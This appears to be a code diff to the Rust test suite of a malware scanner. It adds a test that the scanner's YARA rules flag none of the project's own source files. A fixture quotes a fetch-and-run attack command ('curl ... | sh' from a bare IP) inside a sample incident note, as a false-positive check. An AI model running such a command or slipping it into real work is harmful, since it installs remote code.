@@ -482,11 +482,40 @@ rule Linux_Hacktool_Socat { condition: elf.type == elf.ET_EXEC }
             // would put the strings the rules look for into Qlam's own test
             // binary, which on-access scanning then flags while it's built.
             ("the rule file itself", source("rules/qlam-linux.yar")),
-            ("persistence.rs", source("src/persistence.rs")),
+            ("the heuristics file", source("rules/qlam-heuristics.yar")),
             ("a note", format!("# Incident notes\nThe attacker ran:\n{DROPPER}\ncurl -s http://1.2.3.4/a.sh | sh\n")),
         ] {
             assert!(r.scan(data.as_bytes()).is_none(), "{what} was flagged");
         }
+    }
+
+    /// Qlam's own source tree — Rust, Python, rules, docs, packaging — is
+    /// full of the strings the rules look for (the tests quote samples).
+    /// None of it may be flagged: it ends up in source tarballs and package
+    /// builds that on-access scanning sees (it did, 2026-11-08).
+    #[test]
+    fn own_source_tree_is_clean() {
+        let rules = bundled();
+        let root = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap().to_path_buf();
+        let mut stack = vec![root.clone()];
+        let mut checked = 0;
+        while let Some(dir) = stack.pop() {
+            for e in std::fs::read_dir(&dir).unwrap().flatten() {
+                let p = e.path();
+                let name = e.file_name().to_string_lossy().into_owned();
+                if p.is_dir() {
+                    if !matches!(name.as_str(), ".git" | "target" | "dist-pkg" | "__pycache__" | "venv" | "Logos" | "Screenshots") {
+                        stack.push(p);
+                    }
+                } else if let Ok(data) = std::fs::read(&p) {
+                    checked += 1;
+                    if let Some(m) = rules.scan(&data) {
+                        panic!("{} flagged as {}", p.strip_prefix(&root).unwrap().display(), m.name);
+                    }
+                }
+            }
+        }
+        assert!(checked > 50, "only {checked} files found");
     }
 
     #[test]
